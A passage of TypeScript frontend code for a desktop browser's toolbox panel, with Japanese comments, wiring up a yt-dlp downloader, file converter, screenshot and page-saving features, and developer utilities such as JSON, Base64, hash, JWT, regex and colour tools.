let currentJobId: number | null = null;

async function loadToolboxSettings(): Promise<void> {
  try {
    const s = await invoke<ToolboxSettings>("toolbox_settings_get");
    if (ytdlpDirInput) ytdlpDirInput.value = s.download_dir || "";
  } catch (e) {
    console.error("toolbox_settings_get failed:", e);
  }
}

async function saveToolboxSettings(): Promise<void> {
  const settings: ToolboxSettings = {
    download_dir: ytdlpDirInput?.value ?? "",
  };
  try {
    await invoke("toolbox_settings_set", { settings });
  } catch (e) {
    console.error("toolbox_settings_set failed:", e);
  }
}

async function openToolboxPanel(): Promise<void> {
  if (!toolboxPanel) return;
  try {
    await invoke("ui_set_expanded", { expanded: true });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
  toolboxPanel.hidden = false;
  toolboxOpen = true;
  await loadToolboxSettings();
  // 現在ページ URL を予め埋めない (ユーザー操作優先)
}

async function closeToolboxPanel(): Promise<void> {
  if (!toolboxPanel) return;
  toolboxPanel.hidden = true;
  toolboxOpen = false;
  try {
    await invoke("ui_set_expanded", { expanded: false });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
}

function appendYtdlpLog(line: string, kind: string): void {
  if (!ytdlpLogEl) return;
  const span = document.createElement("span");
  if (kind === "stderr") span.className = "log-stderr";
  else if (kind === "info") span.className = "log-info";
  span.textContent = line + "\n";
  ytdlpLogEl.appendChild(span);
  ytdlpLogEl.scrollTop = ytdlpLogEl.scrollHeight;
}

async function setupToolbox(): Promise<void> {
  toolboxPanel = document.getElementById(
    "toolbox-panel",
  ) as HTMLDivElement | null;
  toolboxOpenBtn = document.getElementById(
    "toolbox-open",
  ) as HTMLButtonElement | null;
  toolboxCloseBtn = document.getElementById(
    "toolbox-close",
  ) as HTMLButtonElement | null;
  ytdlpRunBtn = document.getElementById(
    "ytdlp-run",
  ) as HTMLButtonElement | null;
  ytdlpCancelBtn = document.getElementById(
    "ytdlp-cancel",
  ) as HTMLButtonElement | null;
  ytdlpUrlInput = document.getElementById(
    "ytdlp-url",
  ) as HTMLInputElement | null;
  ytdlpDirInput = document.getElementById(
    "ytdlp-dir",
  ) as HTMLInputElement | null;
  ytdlpModeSel = document.getElementById(
    "ytdlp-mode",
  ) as HTMLSelectElement | null;
  ytdlpQualitySel = document.getElementById(
    "ytdlp-quality",
  ) as HTMLSelectElement | null;
  ytdlpLogEl = document.getElementById("ytdlp-log") as HTMLPreElement | null;
  ytdlpStatusEl = document.getElementById(
    "ytdlp-status",
  ) as HTMLSpanElement | null;
  ytdlpFillBtn = document.getElementById(
    "ytdlp-fill-current",
  ) as HTMLButtonElement | null;
  ytdlpPickDirBtn = document.getElementById(
    "ytdlp-pick-dir",
  ) as HTMLButtonElement | null;

  toolboxOpenBtn?.addEventListener("click", () => {
    void (toolboxOpen ? closeToolboxPanel() : openToolboxPanel());
  });
  toolboxCloseBtn?.addEventListener("click", () => void closeToolboxPanel());

  // ツール切替ナビ
  const navItems = document.querySelectorAll<HTMLButtonElement>(
    "#toolbox-nav .toolbox-nav-item",
  );
  const sections = document.querySelectorAll<HTMLElement>(
    "#toolbox-content .toolbox-tool",
  );
  const selectTool = (name: string): void => {
    navItems.forEach((b) => {
      b.classList.toggle("active", b.dataset.tool === name);
    });
    sections.forEach((s) => {
      s.hidden = s.dataset.tool !== name;
    });
  };
  navItems.forEach((btn) => {
    btn.addEventListener("click", () => {
      const t = btn.dataset.tool;
      if (t) selectTool(t);
    });
  });

  ytdlpFillBtn?.addEventListener("click", () => {
    const a = activeTab();
    if (a && ytdlpUrlInput) ytdlpUrlInput.value = a.url;
  });
  // 形式に応じて画質を表示/非表示
  const qualityWrap = document.getElementById(
    "ytdlp-quality-wrap",
  ) as HTMLElement | null;
  const updateQualityVisibility = (): void => {
    if (!qualityWrap) return;
    qualityWrap.style.display = ytdlpModeSel?.value === "audio" ? "none" : "";
  };
  ytdlpModeSel?.addEventListener("change", updateQualityVisibility);
  updateQualityVisibility();
  ytdlpPickDirBtn?.addEventListener("click", async () => {
    try {
      const initial = ytdlpDirInput?.value ?? "";
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial,
      });
      if (chosen && ytdlpDirInput) {
        ytdlpDirInput.value = chosen;
        await saveToolboxSettings();
      }
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });
  // 設定変更時に保存
  ytdlpDirInput?.addEventListener("change", () => void saveToolboxSettings());

  ytdlpRunBtn?.addEventListener("click", async () => {
    const url = (ytdlpUrlInput?.value ?? "").trim();
    if (!url) {
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = "URL を入力してください";
      return;
    }
    await saveToolboxSettings();
    if (ytdlpLogEl) ytdlpLogEl.textContent = "";
    if (ytdlpStatusEl) ytdlpStatusEl.textContent = "起動中…";
    if (ytdlpRunBtn) ytdlpRunBtn.disabled = true;
    if (ytdlpCancelBtn) ytdlpCancelBtn.disabled = false;
    try {
      const id = await invoke<number>("toolbox_ytdlp_run", {
        args: {
          url,
          mode: ytdlpModeSel?.value ?? "video",
          quality: ytdlpQualitySel?.value ?? "best",
        },
      });
      currentJobId = id;
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = `実行中 (job ${id})`;
    } catch (e) {
      const msg = String(e);
      appendYtdlpLog(`エラー: ${msg}`, "stderr");
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = "エラー";
      if (ytdlpRunBtn) ytdlpRunBtn.disabled = false;
      if (ytdlpCancelBtn) ytdlpCancelBtn.disabled = true;
    }
  });
  ytdlpCancelBtn?.addEventListener("click", () => {
    if (currentJobId === null) return;
    void invoke("toolbox_ytdlp_cancel", { jobId: currentJobId }).catch((e) =>
      console.error("toolbox_ytdlp_cancel failed:", e),
    );
  });

  // バックエンドからの進捗イベント
  void listen<{ job_id: number; line: string; kind: string }>(
    "toolbox-ytdlp-progress",
    (event) => {
      appendYtdlpLog(event.payload.line, event.payload.kind);
    },
  );
  void listen<{ job_id: number; success: boolean; code: number | null }>(
    "toolbox-ytdlp-done",
    (event) => {
      const p = event.payload;
      const txt = p.success ? "完了" : `失敗 (exit ${p.code ?? "?"})`;
      appendYtdlpLog(`--- ${txt} ---`, "info");
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = txt;
      if (ytdlpRunBtn) ytdlpRunBtn.disabled = false;
      if (ytdlpCancelBtn) ytdlpCancelBtn.disabled = true;
      currentJobId = null;
    },
  );

  setupConverter();
  setupVolumeBoost();
  setupSaveHtml();
  setupReader();
  setupScreenshot();
  setupJsonTool();
  setupBase64Tool();
  setupUrlCodecTool();
  setupHashTool();
  setupUuidTool();
  setupTimestampTool();
  setupRegexTool();
  setupJwtTool();
  setupColorTool();
  setupDiffTool();
  setupUserAgentTool();
  setupScrapeTool();
  setupUnzipTool();
  setupClipboardTool();
  setupFileMetaTool();
  setupAudioTagsTool();
  setupGenericMetaTool();
  setupMiniGameTool();
  setupAITool();
  setupUserScriptTool();
  setupTechProfileTool();
  setupOGPTool();
  setupPentestTool();
  setupSpeedtestTool();
  setupCharCountTool();
  setupTodoTool();
  setupClockTool();
  setupTerminalTool();
}

// ===== ファイル形式コンバータ =====

let convInputEl: HTMLInputElement | null = null;
let convOutEl: HTMLInputElement | null = null;
let convFormatSel: HTMLSelectElement | null = null;
let convRunBtn: HTMLButtonElement | null = null;
let convCancelBtn: HTMLButtonElement | null = null;
let convLogEl: HTMLPreElement | null = null;
let convStatusEl: HTMLSpanElement | null = null;
let convJobId: number | null = null;

function appendConvLog(line: string, kind: string): void {
  if (!convLogEl) return;
  const span = document.createElement("span");
  if (kind === "stderr") span.className = "log-stderr";
  else if (kind === "info") span.className = "log-info";
  span.textContent = line + "\n";
  convLogEl.appendChild(span);
  convLogEl.scrollTop = convLogEl.scrollHeight;
}

function setupConverter(): void {
  convInputEl = document.getElementById(
    "conv-input",
  ) as HTMLInputElement | null;
  convOutEl = document.getElementById("conv-out") as HTMLInputElement | null;
  convFormatSel = document.getElementById(
    "conv-format",
  ) as HTMLSelectElement | null;
  convRunBtn = document.getElementById("conv-run") as HTMLButtonElement | null;
  convCancelBtn = document.getElementById(
    "conv-cancel",
  ) as HTMLButtonElement | null;
  convLogEl = document.getElementById("conv-log") as HTMLPreElement | null;
  convStatusEl = document.getElementById(
    "conv-status",
  ) as HTMLSpanElement | null;
  const pickInBtn = document.getElementById(
    "conv-pick-input",
  ) as HTMLButtonElement | null;
  const pickOutBtn = document.getElementById(
    "conv-pick-out",
  ) as HTMLButtonElement | null;

  pickInBtn?.addEventListener("click", async () => {
    try {
      const initial = convInputEl?.value ?? "";
      const chosen = await invoke<string | null>("toolbox_pick_file", {
        initial,
      });
      if (chosen && convInputEl) convInputEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_file failed:", e);
    }
  });
  pickOutBtn?.addEventListener("click", async () => {
    try {
      const initial = convOutEl?.value ?? "";
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial,
      });
      if (chosen && convOutEl) convOutEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });

  convRunBtn?.addEventListener("click", async () => {
    const input = (convInputEl?.value ?? "").trim();
    if (!input) {
      if (convStatusEl)
        convStatusEl.textContent = "入力ファイルを指定してください";
      return;
    }
    if (convLogEl) convLogEl.textContent = "";
    if (convStatusEl) convStatusEl.textContent = "起動中…";
    if (convRunBtn) convRunBtn.disabled = true;
    if (convCancelBtn) convCancelBtn.disabled = false;
    try {
      const id = await invoke<number>("toolbox_convert_run", {
        args: {
          input,
          format: convFormatSel?.value ?? "mp4",
          out_dir: convOutEl?.value ?? "",
        },
      });
      convJobId = id;
      if (convStatusEl) convStatusEl.textContent = `変換中 (job ${id})`;
    } catch (e) {
      const msg = String(e);
      appendConvLog(`エラー: ${msg}`, "stderr");
      if (convStatusEl) convStatusEl.textContent = "エラー";
      if (convRunBtn) convRunBtn.disabled = false;
      if (convCancelBtn) convCancelBtn.disabled = true;
    }
  });
  convCancelBtn?.addEventListener("click", () => {
    if (convJobId === null) return;
    void invoke("toolbox_convert_cancel", { jobId: convJobId }).catch((e) =>
      console.error("toolbox_convert_cancel failed:", e),
    );
  });

  void listen<{ job_id: number; line: string; kind: string }>(
    "toolbox-conv-progress",
    (event) => {
      appendConvLog(event.payload.line, event.payload.kind);
    },
  );
  void listen<{
    job_id: number;
    success: boolean;
    code: number | null;
    output_path: string | null;
  }>("toolbox-conv-done", (event) => {
    const p = event.payload;
    const txt = p.success ? "完了" : `失敗 (exit ${p.code ?? "?"})`;
    appendConvLog(`--- ${txt} ---`, "info");
    if (p.success && p.output_path) {
      appendConvLog(`出力: ${p.output_path}`, "info");
    }
    if (convStatusEl) convStatusEl.textContent = txt;
    if (convRunBtn) convRunBtn.disabled = false;
    if (convCancelBtn) convCancelBtn.disabled = true;
    convJobId = null;
  });
}

// ===== 動画音量ブースト =====

function setupVolumeBoost(): void {
  const range = document.getElementById(
    "vboost-range",
  ) as HTMLInputElement | null;
  const valueEl = document.getElementById(
    "vboost-value",
  ) as HTMLSpanElement | null;
  const applyBtn = document.getElementById(
    "vboost-apply",
  ) as HTMLButtonElement | null;
  const resetBtn = document.getElementById(
    "vboost-reset",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "vboost-status",
  ) as HTMLSpanElement | null;
  if (!range || !valueEl) return;

  const updateLabel = (): void => {
    valueEl.textContent = `${range.value}%`;
  };
  range.addEventListener("input", updateLabel);
  updateLabel();

  const apply = async (gainPct: number): Promise<void> => {
    if (statusEl) statusEl.textContent = "適用中…";
    try {
      await invoke("view_set_volume_boost", { gain: gainPct / 100 });
      if (statusEl) statusEl.textContent = `適用済み (${gainPct}%)`;
    } catch (e) {
      console.error("view_set_volume_boost failed:", e);
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  };

  applyBtn?.addEventListener("click", () => {
    void apply(parseInt(range.value, 10) || 100);
  });
  resetBtn?.addEventListener("click", () => {
    range.value = "100";
    updateLabel();
    void apply(100);
  });
}

// ===== ページ HTML 保存 =====

function setupSaveHtml(): void {
  const urlEl = document.getElementById(
    "savehtml-url",
  ) as HTMLInputElement | null;
  const dirEl = document.getElementById(
    "savehtml-dir",
  ) as HTMLInputElement | null;
  const fillBtn = document.getElementById(
    "savehtml-fill-current",
  ) as HTMLButtonElement | null;
  const pickDirBtn = document.getElementById(
    "savehtml-pick-dir",
  ) as HTMLButtonElement | null;
  const runBtn = document.getElementById(
    "savehtml-run",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "savehtml-status",
  ) as HTMLSpanElement | null;
  const logEl = document.getElementById(
    "savehtml-log",
  ) as HTMLPreElement | null;
  if (!urlEl || !dirEl || !runBtn) return;

  // ダウンロードディレクトリを初期値に
  void (async () => {
    try {
      const def = await invoke<string>("toolbox_default_download_dir");
      if (def && !dirEl.value) dirEl.value = def;
    } catch {
      /* noop */
    }
  })();

  fillBtn?.addEventListener("click", () => {
    const a = activeTab();
    if (a) urlEl.value = a.url;
  });

  pickDirBtn?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial: dirEl.value || null,
      });
      if (chosen) dirEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });

  const appendLog = (line: string, kind: "info" | "err" = "info"): void => {
    if (!logEl) return;
    const span = document.createElement("span");
    span.className = kind === "err" ? "log-stderr" : "log-info";
    span.textContent = line + "\n";
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
  };

  runBtn.addEventListener("click", async () => {
    const url = urlEl.value.trim();
    const dir = dirEl.value.trim();
    if (!url) {
      if (statusEl) statusEl.textContent = "URL を入力してください";
      return;
    }
    if (!dir) {
      if (statusEl) statusEl.textContent = "保存先を選択してください";
      return;
    }
    runBtn.disabled = true;
    if (statusEl) statusEl.textContent = "保存中…";
    appendLog(`取得中: ${url}`);
    try {
      const path = await invoke<string>("toolbox_save_page_html", {
        url,
        dir,
      });
      if (statusEl) statusEl.textContent = "保存しました";
      appendLog(`保存: ${path}`);
    } catch (e) {
      const msg = String(e);
      if (statusEl) statusEl.textContent = `エラー: ${msg}`;
      appendLog(msg, "err");
    } finally {
      runBtn.disabled = false;
    }
  });
}

// ===== リーディングモード =====

function setupReader(): void {
  const applyBtn = document.getElementById(
    "reader-apply",
  ) as HTMLButtonElement | null;
  const disableBtn = document.getElementById(
    "reader-disable",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "reader-status",
  ) as HTMLSpanElement | null;
  if (!applyBtn || !disableBtn) return;

  applyBtn.addEventListener("click", async () => {
    if (statusEl) statusEl.textContent = "適用中…";
    try {
      await invoke("view_set_reader_mode", { enabled: true });
      if (statusEl) statusEl.textContent = "適用しました";
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
  disableBtn.addEventListener("click", async () => {
    try {
      await invoke("view_set_reader_mode", { enabled: false });
      if (statusEl) statusEl.textContent = "解除しました";
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== スクリーンショット =====

function setupScreenshot(): void {
  const dirEl = document.getElementById(
    "screenshot-dir",
  ) as HTMLInputElement | null;
  const pickBtn = document.getElementById(
    "screenshot-pick-dir",
  ) as HTMLButtonElement | null;
  const runBtn = document.getElementById(
    "screenshot-run",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "screenshot-status",
  ) as HTMLSpanElement | null;
  if (!dirEl || !runBtn) return;

  void (async () => {
    try {
      const def = await invoke<string>("toolbox_default_download_dir");
      if (def && !dirEl.value) dirEl.value = def;
    } catch {
      /* noop */
    }
  })();

  pickBtn?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial: dirEl.value || null,
      });
      if (chosen) dirEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });

  runBtn.addEventListener("click", async () => {
    const dir = dirEl.value.trim();
    if (!dir) {
      if (statusEl) statusEl.textContent = "保存先を選択してください";
      return;
    }
    runBtn.disabled = true;
    if (statusEl) statusEl.textContent = "撮影中…";
    try {
      const path = await invoke<string>("toolbox_screenshot", { dir });
      if (statusEl) statusEl.textContent = `保存: ${path}`;
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    } finally {
      runBtn.disabled = false;
    }
  });
}

// ===== 開発者向けツール群 =====

function $id<T extends HTMLElement>(id: string): T | null {
  return document.getElementById(id) as T | null;
}

// JSON 整形 / 検証
function setupJsonTool(): void {
  const input = $id<HTMLTextAreaElement>("json-input");
  const output = $id<HTMLTextAreaElement>("json-output");
  const status = $id<HTMLSpanElement>("json-status");
  const fmt2 = $id<HTMLButtonElement>("json-format");
  const fmt4 = $id<HTMLButtonElement>("json-format-4");
  const minify = $id<HTMLButtonElement>("json-minify");
  const sortBtn = $id<HTMLButtonElement>("json-sort");
  const copyBtn = $id<HTMLButtonElement>("json-copy");
  if (!input || !output) return;

  const sortKeys = (v: unknown): unknown => {
    if (Array.isArray(v)) return v.map(sortKeys);
    if (v && typeof v === "object") {
      const o = v as Record<string, unknown>;
      const out: Record<string, unknown> = {};
      for (const k of Object.keys(o).sort()) out[k] = sortKeys(o[k]);
      return out;
    }
    return v;
  };
  const run = (mode: "2" | "4" | "min" | "sort"): void => {
    try {
      const parsed = JSON.parse(input.value);
      const v = mode === "sort" ? sortKeys(parsed) : parsed;
      let text: string;
      if (mode === "min") text = JSON.stringify(v);
      else if (mode === "4") text = JSON.stringify(v, null, 4);
      else text = JSON.stringify(v, null, 2);
      output.value = text;
      if (status) {
        status.textContent = `OK (${text.length} 文字)`;
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      output.value = "";
      if (status) {
        status.textContent = `エラー: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
    }
  };
  fmt2?.addEventListener("click", () => run("2"));
  fmt4?.addEventListener("click", () => run("4"));
  minify?.addEventListener("click", () => run("min"));
  sortBtn?.addEventListener("click", () => run("sort"));
  copyBtn?.addEventListener("click", () => {
    void navigator.clipboard.writeText(output.value);
    if (status) status.textContent = "コピーしました";
  });
}

// Base64
function setupBase64Tool(): void {
  const plain = $id<HTMLTextAreaElement>("b64-plain");
  const enc = $id<HTMLTextAreaElement>("b64-encoded");
  const urlsafe = $id<HTMLInputElement>("b64-urlsafe");
  const status = $id<HTMLSpanElement>("b64-status");
  if (!plain || !enc || !urlsafe) return;
  let updating = false;
  const enc2url = (s: string): string =>
    s.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  const url2enc = (s: string): string => {
    let r = s.replace(/-/g, "+").replace(/_/g, "/");
    while (r.length % 4) r += "=";
    return r;
  };
  const fromPlain = (): void => {
    if (updating) return;
    updating = true;
    try {
      const bytes = new TextEncoder().encode(plain.value);
      let bin = "";
      for (const b of bytes) bin += String.fromCharCode(b);
      let out = btoa(bin);
      if (urlsafe.checked) out = enc2url(out);
      enc.value = out;
      if (status) {
        status.textContent = "";
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      if (status) {
        status.textContent = String(e);
        status.classList.add("toolbox-error");
      }
    }
    updating = false;
  };
  const fromEnc = (): void => {
    if (updating) return;
    updating = true;
    try {
      const src = urlsafe.checked ? url2enc(enc.value) : enc.value;
      const bin = atob(src.trim());
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      plain.value = new TextDecoder().decode(bytes);
      if (status) {
        status.textContent = "";
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      if (status) {
        status.textContent = `デコード失敗: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
    }
    updating = false;
  };
  plain.addEventListener("input", fromPlain);
  enc.addEventListener("input", fromEnc);
  urlsafe.addEventListener("change", fromPlain);
}

// URL エンコード
function setupUrlCodecTool(): void {
  const plain = $id<HTMLTextAreaElement>("url-plain");
  const enc = $id<HTMLTextAreaElement>("url-encoded");
  const comp = $id<HTMLInputElement>("url-component");
  const parseEl = $id<HTMLInputElement>("url-parse");
  const parsed = $id<HTMLPreElement>("url-parsed");
  const status = $id<HTMLSpanElement>("url-status");
  if (!plain || !enc || !comp || !parseEl || !parsed) return;
  let updating = false;
  const fromPlain = (): void => {
    if (updating) return;
    updating = true;
    try {
      enc.value = comp.checked
        ? encodeURIComponent(plain.value)
        : encodeURI(plain.value);
      if (status) status.textContent = "";
    } catch (e) {
      if (status) status.textContent = String(e);
    }
    updating = false;
  };
  const fromEnc = (): void => {
    if (updating) return;
    updating = true;
    try {
      plain.value = comp.checked
        ? decodeURIComponent(enc.value)
        : decodeURI(enc.value);
      if (status) status.textContent = "";
    } catch (e) {
      if (status) status.textContent = `デコード失敗: ${String(e)}`;
    }
    updating = false;
  };
  plain.addEventListener("input", fromPlain);
  enc.addEventListener("input", fromEnc);
  comp.addEventListener("change", fromPlain);

  parseEl.addEventListener("input", () => {
    const v = parseEl.value.trim();
    if (!v) {
      parsed.textContent = "";
      return;
    }
    try {
      const u = new URL(v);
      const params: Record<string, string[]> = {};
      u.searchParams.forEach((val, key) => {
        if (!params[key]) params[key] = [];
        params[key].push(val);
      });
      const obj = {
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port,
        pathname: u.pathname,
        search: u.search,
        hash: u.hash,
        username: u.username,
        password: u.password,
        params,
      };
      parsed.textContent = JSON.stringify(obj, null, 2);
    } catch (e) {
      parsed.textContent = `解析失敗: ${String(e)}`;
    }
  });
}

// ハッシュ
function setupHashTool(): void {
  const input = $id<HTMLTextAreaElement>("hash-input");
  const out1 = $id<HTMLPreElement>("hash-sha1");
  const out256 = $id<HTMLPreElement>("hash-sha256");
  const out384 = $id<HTMLPreElement>("hash-sha384");
  const out512 = $id<HTMLPreElement>("hash-sha512");
  if (!input || !out1 || !out256 || !out384 || !out512) return;
  const hex = (buf: ArrayBuffer): string =>
    Array.from(new Uint8Array(buf))
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");
  let token = 0;
  const update = async (): Promise<void> => {
    const my = ++token;
    const data = new TextEncoder().encode(input.value);
    const [a, b, c, d] = await Promise.all([
      crypto.subtle.digest("SHA-1", data),
      crypto.subtle.digest("SHA-256", data),
      crypto.subtle.digest("SHA-384", data),
      crypto.subtle.digest("SHA-512", data),
    ]);
    if (my !== token) return;
    out1.textContent = hex(a);
    out256.textContent = hex(b);
    out384.textContent = hex(c);
    out512.textContent = hex(d);
  };
  input.addEventListener("input", () => void update());
  void update();
}

// UUID
function setupUuidTool(): void {
  const count = $id<HTMLInputElement>("uuid-count");
  const upper = $id<HTMLInputElement>("uuid-uppercase");
  const noh = $id<HTMLInputElement>("uuid-nohyphen");
  const out = $id<HTMLTextAreaElement>("uuid-output");
  const gen = $id<HTMLButtonElement>("uuid-generate");
  const copy = $id<HTMLButtonElement>("uuid-copy");
  if (!count || !out || !gen) return;
  const uuid4 = (): string => {
    if (typeof crypto.randomUUID === "function") return crypto.randomUUID();
    const b = crypto.getRandomValues(new Uint8Array(16));
    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;
    const h = Array.from(b, (x) => x.toString(16).padStart(2, "0"));
    return `${h.slice(0, 4).join("")}-${h.slice(4, 6).join("")}-${h.slice(6, 8).join("")}-${h.slice(8, 10).join("")}-${h.slice(10, 16).join("")}`;
  };
  const run = (): void => {
    const n = Math.max(1, Math.min(1000, parseInt(count.value, 10) || 1));
    const arr: string[] = [];
    for (let i = 0; i < n; i++) {
      let u = uuid4();
      if (noh?.checked) u = u.replace(/-/g, "");
      if (upper?.checked) u = u.toUpperCase();
      arr.push(u);
    }
    out.value = arr.join("\n");
  };
  gen.addEventListener("click", run);
  copy?.addEventListener("click", () => {
    void navigator.clipboard.writeText(out.value);
  });
  run();
}

// タイムスタンプ
function setupTimestampTool(): void {
  const now = $id<HTMLPreElement>("ts-now");
  const refresh = $id<HTMLButtonElement>("ts-now-refresh");
  const unix = $id<HTMLInputElement>("ts-unix");
  const unixNow = $id<HTMLButtonElement>("ts-unix-now");
  const iso = $id<HTMLInputElement>("ts-iso");
  const local = $id<HTMLPreElement>("ts-local");
  const utc = $id<HTMLPreElement>("ts-utc");
  const ms = $id<HTMLPreElement>("ts-ms");
  if (!now || !unix || !iso || !local || !utc || !ms) return;
  let updating = false;
  const showNow = (): void => {
    const d = new Date();
    now.textContent = `${d.toISOString()}  /  unix=${Math.floor(d.getTime() / 1000)}`;
  };
  const fillFrom = (d: Date): void => {
    if (Number.isNaN(d.getTime())) {
      local.textContent = utc.textContent = ms.textContent = "(不正)";
      return;
    }
    local.textContent = d.toString();
    utc.textContent = d.toUTCString();
    ms.textContent = String(d.getTime());
  };
  unix.addEventListener("input", () => {
    if (updating) return;
    updating = true;
    const v = parseFloat(unix.value);
    if (Number.isFinite(v)) {
      const d = new Date(v * 1000);
      iso.value = d.toISOString();
      fillFrom(d);
    }
    updating = false;
  });
  iso.addEventListener("input", () => {
    if (updating) return;
    updating = true;
    const d = new Date(iso.value);
    if (!Number.isNaN(d.getTime())) {
      unix.value = String(Math.floor(d.getTime() / 1000));
      fillFrom(d);
    } else {
      fillFrom(d);
    }
    updating = false;
  });
  unixNow?.addEventListener("click", () => {
    unix.value = String(Math.floor(Date.now() / 1000));
    unix.dispatchEvent(new Event("input"));
  });
  refresh?.addEventListener("click", showNow);
  showNow();
}

// 正規表現
function setupRegexTool(): void {
  const pat = $id<HTMLInputElement>("regex-pattern");
  const flags = $id<HTMLInputElement>("regex-flags");
  const input = $id<HTMLTextAreaElement>("regex-input");
  const status = $id<HTMLSpanElement>("regex-status");
  const hl = $id<HTMLPreElement>("regex-highlight");
  const list = $id<HTMLPreElement>("regex-matches");
  if (!pat || !flags || !input || !hl || !list) return;
  const escapeHtml = (s: string): string =>
    s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const run = (): void => {
    if (!pat.value) {
      hl.innerHTML = escapeHtml(input.value);
      list.textContent = "";
      if (status) status.textContent = "";
      return;
    }
    let f = flags.value;
    if (!f.includes("g")) f += "g";
    let re: RegExp;
    try {
      re = new RegExp(pat.value, f);
    } catch (e) {
      if (status) {
        status.textContent = `パターンエラー: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
      hl.textContent = "";
      list.textContent = "";
      return;
    }
    if (status) {
      status.classList.remove("toolbox-error");
    }
    const text = input.value;
    const matches: RegExpExecArray[] = [];
    let m: RegExpExecArray | null;
    let safety = 0;
    while ((m = re.exec(text))) {
      matches.push(m);
      if (m[0].length === 0) re.lastIndex++;
      if (++safety > 10000) break;
    }
    if (status) status.textContent = `${matches.length} 件マッチ`;
    let html = "";
    let last = 0;
    for (const mm of matches) {
      const start = mm.index;
      const end = start + mm[0].length;
      html += escapeHtml(text.slice(last, start));
      html += `<span class="regex-match-mark">${escapeHtml(mm[0])}</span>`;
      last = end;
    }
    html += escapeHtml(text.slice(last));
    hl.innerHTML = html;
    list.textContent = matches
      .map((mm, i) => {
        const groups =
          mm.length > 1 ? `  groups=${JSON.stringify(mm.slice(1))}` : "";
        return `${i + 1}: [${mm.index}] "${mm[0]}"${groups}`;
      })
      .join("\n");
  };
  pat.addEventListener("input", run);
  flags.addEventListener("input", run);
  input.addEventListener("input", run);
}

// JWT
function setupJwtTool(): void {
  const input = $id<HTMLTextAreaElement>("jwt-input");
  const header = $id<HTMLPreElement>("jwt-header");
  const payload = $id<HTMLPreElement>("jwt-payload");
  const status = $id<HTMLSpanElement>("jwt-status");
  if (!input || !header || !payload) return;
  const b64urlDecode = (s: string): string => {
    let r = s.replace(/-/g, "+").replace(/_/g, "/");
    while (r.length % 4) r += "=";
    const bin = atob(r);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return new TextDecoder().decode(bytes);
  };
  const pretty = (s: string): string => {
    try {
      return JSON.stringify(JSON.parse(s), null, 2);
    } catch {
      return s;
    }
  };
  const run = (): void => {
    const t = input.value.trim();
    if (!t) {
      header.textContent = payload.textContent = "";
      if (status) status.textContent = "";
      return;
    }
    const parts = t.split(".");
    if (parts.length < 2) {
      if (status) {
        status.textContent = "JWT の形式ではありません";
        status.classList.add("toolbox-error");
      }
      return;
    }
    try {
      header.textContent = pretty(b64urlDecode(parts[0]));
      payload.textContent = pretty(b64urlDecode(parts[1]));
      if (status) {
        status.textContent = `OK (署名=${parts[2] ? "あり" : "なし"})`;
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      if (status) {
        status.textContent = `デコード失敗: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
    }
  };
  input.addEventListener("input", run);
}

// カラー
function setupColorTool(): void {
  const swatch = $id<HTMLDivElement>("color-swatch");
  const picker = $id<HTMLInputElement>("color-picker");
  const hex = $id<HTMLInputElement>("color-hex");
  const rgb = $id<HTMLInputElement>("color-rgb");
  const hsl = $id<HTMLInputElement>("color-hsl");
  const status = $id<HTMLSpanElement>("color-status");
  if (!swatch || !picker || !hex || !rgb || !hsl) return;
  let updating = false;
  const rgbToHsl = (
    r: number,
    g: number,
    b: number,
  ): [number, number, number] => {
    r /= 255;
    g /= 255;
    b /= 255;
    const max = Math.max(r, g, b);
    const min = Math.min(r, g, b);
    let h = 0;
    let s = 0;
    const l = (max + min) / 2;
    if (max !== min) {
      const d = max - min;
      s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
      switch (max) {
        case r:
          h = (g - b) / d + (g < b ? 6 : 0);
          break;
        case g:
          h = (b - r) / d + 2;
          break;
        default:
          h = (r - g) / d + 4;
      }
      h *= 60;
    }
